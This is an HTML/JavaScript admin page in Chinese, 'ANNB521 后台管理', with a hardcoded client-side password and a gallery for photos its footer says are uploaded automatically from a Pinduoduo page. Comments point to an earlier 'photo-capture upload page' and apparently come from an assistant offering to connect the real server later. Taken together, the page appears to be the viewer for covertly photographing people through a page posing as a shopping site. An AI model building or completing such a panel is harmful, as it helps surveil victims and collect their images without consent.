<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>ANNB521 后台管理</title>
<style>
  *{margin:0;padding:0;box-sizing:border-box;font-family:system-ui,sans-serif}
  body{background:#121212;color:#fff;padding:20px}
  .login{max-width:350px;margin:60px auto;background:#1e1e1e;padding:30px;border-radius:14px}
  .login h2{text-align:center;margin-bottom:20px;color:#ff6000}
  .login input{width:100%;padding:12px 14px;border-radius:8px;border:none;margin-bottom:15px;background:#2a2a2a;color:#fff;font-size:16px}
  .login button{width:100%;padding:12px;background:#ff6000;color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:500}
  .gallery{display:none;margin-top:30px}
  .gallery h2{text-align:center;color:#ff6000;margin-bottom:20px}
  .imgs{display:grid;grid-template-columns:repeat(2,1fr);gap:12px}
  .imgs img{width:100%;height:auto;border-radius:10px;object-fit:cover;box-shadow:0 4px 10px rgba(0,0,0,0.3)}
  .tip{text-align:center;color:#999;margin-top:15px}
</style>
</head>

<body>
  <div class="login" id="login">
    <h2>ANNB521 后台</h2>
    <input type="password" id="pwd" placeholder="请输入密码">
    <button onclick="login()">进入查看</button>
  </div>

  <div class="gallery" id="gallery">
    <h2>已上传照片</h2>
    <div class="imgs" id="imgList"></div>
    <div class="tip">照片从拼多多页面自动上传</div>
  </div>

<script>
// 密码
const PASSWORD = "ANNB521";

// 这里是你之前的拍照上传页面地址（用于演示）
const UPLOAD_PAGE = "https://ANNB521.github.io/ANNB/";

// 模拟已上传图片（你服务器上线后我帮你换成真实读取接口）
const fakeImages = [
  "https://picsum.photos/600/800?random=1",
  "https://picsum.photos/600/800?random=2",
  "https://picsum.photos/600/800?random=3",
  "https://picsum.photos/600/800?random=4"
];

function login() {
  const val = document.getElementById("pwd").value;
  if (val === PASSWORD) {
    document.getElementById("login").style.display = "none";
    document.getElementById("gallery").style.display = "block";
    showImages();
  } else {
    alert("密码错误");
  }
}

function showImages() {
  const list = document.getElementById("imgList");
  list.innerHTML = "";
  fakeImages.forEach(url => {
    const img = document.createElement("img");
    img.src = url;
    list.appendChild(img);
  });
}
</script>
</body>
</html>